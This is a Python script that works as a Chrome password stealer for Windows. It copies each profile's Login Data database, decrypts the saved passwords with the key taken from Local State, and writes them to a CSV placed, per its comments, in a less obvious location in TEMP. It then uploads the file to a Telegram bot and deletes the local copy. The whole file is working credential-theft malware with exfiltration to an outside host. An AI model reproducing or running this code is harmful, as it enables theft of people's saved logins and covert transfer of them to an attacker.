import os 
import sqlite3
import csv
import json
import shutil
import win32crypt
from Crypto.Cipher import AES
import base64
import requests
import platform
import getpass

# Replace these with your Telegram bot token and chat ID
BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = '2141142912'

# Generate paths for all profiles, including Default
chrome_profiles = []
profile_names = []

# Check for the Default profile
default_profile_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
if os.path.exists(default_profile_path):
    chrome_profiles.append(default_profile_path)
    profile_names.append('Default')

# Add other profiles
for i in range(21):  # Adjust the range based on the number of profiles you want to include
    profile_path = os.path.expandvars(f'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile {i}')
    login_data_path = os.path.join(profile_path, "Login Data")
    login_data_account_path = os.path.join(profile_path, "Login Data For Account")
    
    # Check if the paths exist before adding them
    if os.path.exists(login_data_path):
        chrome_profiles.append(login_data_path)
        profile_names.append(f'Profile {i}')
    if os.path.exists(login_data_account_path):
        chrome_profiles.append(login_data_account_path)
        profile_names.append(f'Profile {i} (Account)')

# Fetch encryption key
def get_encryption_key():
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    with open(local_state_path, "r") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt saved passwords
def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

# Prepare CSV file with OS version, user name, and profile names
os_version = platform.platform()
user_name = getpass.getuser()

# Change the CSV name and path to a less obvious location
csv_file_path = os.path.join(os.environ['TEMP'], "data_report.csv")

with open(csv_file_path, "w", newline="") as file:
    writer = csv.writer(file)
    
    # Example Format 1
    writer.writerow(["OS Version", "User Name", "Profile Name", "Website", "Username/Email", "Password"])
    
    encryption_key = get_encryption_key()
    
    for idx, chrome_path in enumerate(chrome_profiles):
        if os.path.exists(chrome_path):
            # Make a temporary copy of each Login Data file
            temp_path = os.path.expandvars(r'%LOCALAPPDATA%\Temp\Login Data.db')
            shutil.copyfile(chrome_path, temp_path)

            # Connect to the SQLite database and retrieve data
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                website, username, encrypted_password = row
                decrypted_password = decrypt_password(encrypted_password, encryption_key)
                
                # Example Format 1
                writer.writerow([os_version, user_name, profile_names[idx], website, username, decrypted_password])

            conn.close()
            os.remove(temp_path)

# Send the CSV file to Telegram
def send_to_telegram():
    try:
        with open(csv_file_path, "rb") as file:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
            files = {'document': file}
            data = {
                'chat_id': CHAT_ID,
                'caption': 'Chrome saved passwords'
            }

            response = requests.post(url, files=files, data=data)
            response.raise_for_status()  # Raise an error for bad responses
            
            # Print the response for debugging
            print("Response from Telegram:", response.json())
            
            print("Passwords sent to Telegram successfully!")
    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP error occurred: {http_err}")  # Print HTTP error
    except Exception as err:
        print(f"Other error occurred: {err}")  # Print general error
    finally:
        # Delete the CSV file from the system
        try:
            os.remove(csv_file_path)
            print("CSV file deleted from system.")
        except Exception as e:
            print(f"Error deleting CSV file: {e}")

# Send the CSV file to Telegram
send_to_telegram()
